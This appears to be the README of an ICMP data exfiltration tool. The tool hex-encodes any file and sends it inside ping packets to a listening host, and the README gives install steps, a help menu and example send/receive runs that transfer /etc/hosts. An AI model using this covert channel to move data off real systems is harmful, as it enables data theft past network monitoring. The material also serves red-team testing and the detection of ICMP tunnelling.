# ICMP-Data-Exfiltration

This program is used to send data over the network within "ICMP Packets", with the help of the "PING" command.
we can send any type of file over the network between two hosts with the help of this script.


## Requirements
Need to have the [Scapy] library installed to sniff packets on the network.

### Installations
```bash 

pip3 install scapy

```
or
```bash 

sudo apt install python3-scapy

```

## Examples of How To Use
The program has two modes.

### RECV
First one "RECV", we will use this mode as a receiver by running this mode we will automatically
start listening for any "ICMP packets" that are coming towards our host machine, once we start receiving packets
this script will automatically decode the message and print it to the display and also in the same time the script
will save the output to indicate file.

### SEND
Second mode "SEND", with the help of this mode we can send any type of file we want to another host 
where it is listening for our communication, we just need to provide the destination "IP-Address" and "FILE NAME" 
to the script, and it will automatically convert our data into "HEXADECIMAL" and send it to its destination.

### Help Menu
#### icmp_exfiltration.py
```bash
❯ sudo python3 icmp_exfiltration.py

┃  [!] Usage icmp_exfiltration.py -i <Adaptor name / IP Address> -m <Mode> -f <Filename>   
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

┃  [-i] Network Adaptor name

┃  [-m] Mode to use

         send
         recv

┃  [-f] File name to save data or to send.

┃  [-h] Help Panel
                      
```

### Usage
#### Receiving data
```bash
sudo python3 icmp_exfiltration.py -i wlan0 -m recv -f mydata
                                                                                                                                                                                      
┃  [*]  Listening for any incoming connections...                                                                                                                                         
                                                                                                                                                                                          
┃  [*]  Saving data to file 

127.0.0.1       localhost
127.0.1.1       Gurpreet06                        
```

#### Sending data
```bash
❯ sudo python3 icmp_exfiltration.py -i 127.0.0.1 -m send -f /etc/hosts

┃  [*]  Hosts active,  Linux system

┃  [*]  Trying to send file..

100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 560000/560000 [00:00<00:00, 4217833.49it/s]

┃  [*]  File sent successfully
```

## Test

https://user-images.githubusercontent.com/74554439/158383077-c02c0ac6-f7a5-4002-836d-d07e8c91b226.mp4



